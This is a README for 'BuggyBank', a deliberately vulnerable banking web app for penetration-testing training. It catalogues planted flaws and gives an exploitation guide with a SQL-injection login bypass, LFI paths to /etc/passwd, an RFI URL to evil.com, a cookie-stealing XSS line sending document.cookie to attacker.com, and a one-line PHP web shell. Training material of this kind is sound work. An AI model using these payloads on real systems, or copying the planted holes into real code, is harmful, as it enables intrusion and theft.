# BuggyBank - Vulnerable Banking Application

A fully functional web application simulating an online banking platform with integrated security vulnerabilities for penetration testing training.

## ⚠️ WARNING

This application contains **intentional security vulnerabilities** for educational purposes. **DO NOT** use this application in production or with real financial data. This is designed for security training and penetration testing practice only.

## Features

- Complete banking interface with modern UI
- User authentication and session management
- Transaction history and fund transfers
- Support messaging system
- File upload functionality
- Help documentation system
- Admin audit and reporting pages

## Vulnerabilities Included

### 1. SQL Injection
- **Location**: `/login` endpoint
- **Vulnerability**: Direct string concatenation in SQL queries
- **Exploit**: `' OR '1'='1` in username field
- **Impact**: Authentication bypass

### 2. Cross-Site Scripting (XSS)
- **Stored XSS**: Support messages, transaction notes, user bio
- **DOM XSS**: Profile page bio preview
- **Exploit**: `<script>alert('XSS')</script>`
- **Impact**: Cookie theft, session hijacking

### 3. Cross-Site Request Forgery (CSRF)
- **Location**: `/transfer` endpoint
- **Vulnerability**: No CSRF tokens
- **Exploit**: Malicious form submission from external site
- **Impact**: Unauthorized fund transfers

### 4. File Upload Vulnerabilities
- **Location**: `/upload-document` endpoint
- **Vulnerability**: No file type validation
- **Exploit**: Upload `.php`, `.js`, or other executable files
- **Impact**: Remote code execution

### 5. Local/Remote File Inclusion (LFI/RFI)
- **Location**: `/help` endpoint
- **Vulnerability**: Direct file inclusion without sanitization
- **Exploit**: 
  - LFI: `?topic=../../../etc/passwd`
  - RFI: `?topic=http://evil.com/malicious.txt`
- **Impact**: Information disclosure, remote code execution

### 6. Insecure Direct Object References (IDOR)
- **Location**: `/transactions/:id` endpoint
- **Vulnerability**: No authorization check
- **Exploit**: Access any transaction by ID
- **Impact**: Data exposure

### 7. Session Fixation
- **Location**: `/login` endpoint
- **Vulnerability**: No session regeneration on login
- **Exploit**: Reuse session IDs
- **Impact**: Session hijacking

### 8. Forced Browsing
- **Locations**: `/admin/reports`, `/admin/user-audit`, `/api/v1/*`
- **Vulnerability**: No authentication checks
- **Exploit**: Direct URL access
- **Impact**: Unauthorized access to sensitive data

### 9. Missing Security Headers
- **Vulnerability**: No HttpOnly, Secure, or SameSite cookie flags
- **Impact**: Cookie theft via XSS

### 10. No Rate Limiting
- **Vulnerability**: No rate limiting on any endpoints
- **Impact**: Brute force attacks, DoS

## Technology Stack

- **Backend**: Node.js + Express
- **Database**: MySQL
- **Frontend**: HTML5, CSS3, JavaScript (vanilla)
- **Sessions**: express-session with cookie-based storage

## Installation

### Prerequisites

- Node.js (v14 or higher)
- MySQL (v8.0 or higher)
- npm or yarn

### Setup Instructions

1. **Clone the repository**
   ```bash
   git clone <repository-url>
   cd BuggyBank
   ```

2. **Install dependencies**
   ```bash
   npm install
   ```

3. **Configure MySQL**
   - Start MySQL service
   - Create a database user (or use root)
   - Update database connection in `server.js` and `setup-database.js` if needed

4. **Setup database**
   ```bash
   npm run setup-db
   ```

5. **Start the application**
   ```bash
   npm start
   ```

6. **Access the application**
   - Open browser and navigate to `http://localhost:3000`
   - Login with test accounts:
     - Username: `alice`, Password: `password123`
     - Username: `bob`, Password: `password123`
     - Username: `admin`, Password: `admin123`
     - Username: `testuser`, Password: `test123`

## Test Accounts

| Username | Password | Role |
|----------|----------|------|
| alice    | password123 | user |
| bob      | password123 | user |
| admin    | admin123    | admin |
| testuser | test123     | user |

## Vulnerability Exploitation Guide

### SQL Injection
```bash
# Login bypass
Username: ' OR '1'='1
Password: anything
```

### XSS Payloads
```html
<!-- Basic alert -->
<script>alert('XSS')</script>

<!-- Cookie theft -->
<script>fetch('http://attacker.com/steal?cookie='+document.cookie)</script>

<!-- DOM XSS in profile bio -->
<img src=x onerror=alert('DOM XSS')>
```

### LFI/RFI
```bash
# Local File Inclusion
/help?topic=../../../etc/passwd
/help?topic=../../../../etc/hosts

# Remote File Inclusion
/help?topic=http://evil.com/malicious.txt
```

### File Upload
```bash
# Upload a PHP shell
# Create file: shell.php
<?php system($_GET['cmd']); ?>

# Access via: /documents/shell.php?cmd=ls
```

### IDOR
```bash
# Access other users' transactions
# Login as alice, then access:
/transactions/4  # Bob's transaction
/transactions/5  # Bob's transaction
```

### Forced Browsing
```bash
# Admin pages (no auth required)
/admin/reports
/admin/user-audit

# API endpoints (no auth required)
/api/v1/transactions/export
/api/v1/users/list
```

## Project Structure

```
BuggyBank/
├── server.js              # Main application server
├── setup-database.js      # Database setup script
├── package.json           # Dependencies and scripts
├── views/                 # HTML templates
│   ├── dashboard.html
│   ├── profile.html
│   ├── transactions.html
│   ├── support-messages.html
│   ├── help.html
│   └── admin-*.html
├── public/                # Static files
│   ├── css/
│   │   └── style.css
│   ├── login.html
│   ├── transfer.html
│   └── upload.html
├── help/                  # Help files for LFI
│   ├── welcome.txt
│   ├── transfer.txt
│   ├── security.txt
│   └── faq.txt
└── uploads/               # File upload directory
```

## Database Schema

### Tables
- `users` - User accounts and profiles
- `sessions` - Session management
- `transactions` - Financial transactions
- `support_messages` - Support system messages
- `uploaded_files` - File upload records
- `audit_logs` - Activity logging

## Security Training Scenarios

### Scenario 1: Authentication Bypass
1. Use SQL injection to bypass login
2. Access other user accounts
3. Explore the application as different users

### Scenario 2: Data Exfiltration
1. Use XSS to steal session cookies
2. Use IDOR to access other users' data
3. Use LFI to read system files

### Scenario 3: File Upload Attack
1. Upload a malicious file
2. Execute the file via the web server
3. Gain remote code execution

### Scenario 4: Admin Access
1. Discover hidden admin endpoints
2. Access sensitive administrative data
3. Understand the impact of missing access controls

## Contributing

This is a training application. If you find additional vulnerabilities or want to add new features for training purposes, please submit a pull request.

## License

This project is for educational purposes only. Use responsibly and only in controlled training environments.

## Disclaimer

This application is designed for security training and educational purposes only. The vulnerabilities are intentional and should not be used as examples of secure coding practices. Always follow security best practices in production applications. 